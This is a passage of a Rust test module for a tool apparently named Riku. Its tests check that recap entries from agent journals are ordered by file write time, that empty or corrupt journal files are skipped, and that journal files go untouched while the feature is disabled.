        let handoffs: Vec<Handoff> = recap.older.iter().map(|o| o.handoff).collect();
        assert_eq!(
            handoffs,
            vec![
                Handoff::NeedsYou,
                Handoff::NeedsReview,
                Handoff::NeedsReview,
                Handoff::NeedsReview,
                Handoff::NeedsReview
            ],
            "the two dropped are the calm ones, not a question"
        );
    }

    #[test]
    fn older_lines_at_the_same_handoff_status_are_ordered_by_the_file_not_the_stamp() {
        // The same reason the cards use `last_event_at`, and it bites harder
        // here: the list is capped, so an entry stamped in the year 3000 would
        // not merely sit at the top, it would push a real question off the end.
        let stale = "/Users/x/repos/aaa";
        let fresh = "/Users/x/repos/bbb";
        let year_3000 = Utc.with_ymd_and_hms(3000, 1, 1, 9, 0, 0).unwrap();

        let recap = recap(
            &[],
            true,
            journals(vec![
                (
                    stale,
                    agent_line(&slug(stale), "s", year_3000, "needs-you", "Claimed", "Me"),
                ),
                (
                    fresh,
                    agent_line(&slug(fresh), "s", at(8), "needs-you", "Real", "And me"),
                ),
            ]),
            // The filesystem's word: bbb was written last.
            listing(vec![(stale, at(9)), (fresh, at(11))]),
            no_sessions,
            at(12),
        );

        let order: Vec<&str> = recap.older.iter().map(|o| o.slug.as_str()).collect();
        assert_eq!(order, vec![slug(fresh), slug(stale)]);
    }

    #[test]
    fn a_journal_file_with_nothing_usable_in_it_is_not_an_older_project() {
        // An empty or corrupt file is the "no prose" case a card already falls
        // back on, and a line has nothing to fall back to — so it is no line.
        let empty = "/Users/x/repos/empty";
        let corrupt = "/Users/x/repos/corrupt";

        let recap = recap(
            &[],
            true,
            journals(vec![(corrupt, "not json at all\n{\n".to_string())]),
            listing(vec![(empty, at(9)), (corrupt, at(10))]),
            no_sessions,
            at(11),
        );

        assert!(recap.cards.is_empty());
        assert!(
            recap.older.is_empty() && recap.older_total == 0,
            "{:?}",
            recap.older
        );
    }

    #[test]
    fn the_journal_is_not_read_at_all_while_the_feature_is_off() {
        // Off by default, and off means untouched: the prose on disk is the most
        // sensitive thing Riku holds, so a board serving a recap nobody opted
        // into must not open the file to find that out (ADR 0013).
        let recap = recap(
            &[session("sess-1", CWD, at(9))],
            false,
            |_: &str| panic!("the journal must not be read while journal.enabled is false"),
            || panic!("the journal directory must not be listed while journal.enabled is false"),
            store(vec![session("sess-1", CWD, at(9))]),
            at(10),
        );

        assert!(!recap.enabled, "the payload says why there is no prose");
        assert_eq!(
            recap.cards.len(),
            1,
            "the projects are still there; only the prose is withheld"
        );
        assert!(recap.cards[0].journal.is_none());
    }
}
